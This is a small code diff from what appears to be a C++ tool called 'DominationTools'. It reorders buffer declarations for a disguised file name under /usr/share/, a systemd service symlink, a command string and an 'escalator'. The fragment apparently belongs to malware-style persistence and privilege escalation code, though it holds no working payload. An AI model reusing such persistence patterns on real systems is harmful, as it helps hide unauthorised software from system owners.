@@ -13,10 +13,10 @@ class DominationTools{
 			   "WantedBy=multi-user.target\n";
 
 
+		char path[12 + sizeof(Current.fakename)]="/usr/share/";
 		char symb[sizeof(Current.fakename)+21]="/etc/systemd/system/";
 		char cmd[sizeof(path) + sizeof(Current.fakename) - 4];
 		char escalator[sizeof(Current.name)*2 + 38];
-		char path[12 + sizeof(Current.fakename)]="/usr/share/";
 
 	public:
 		DominationTools(){
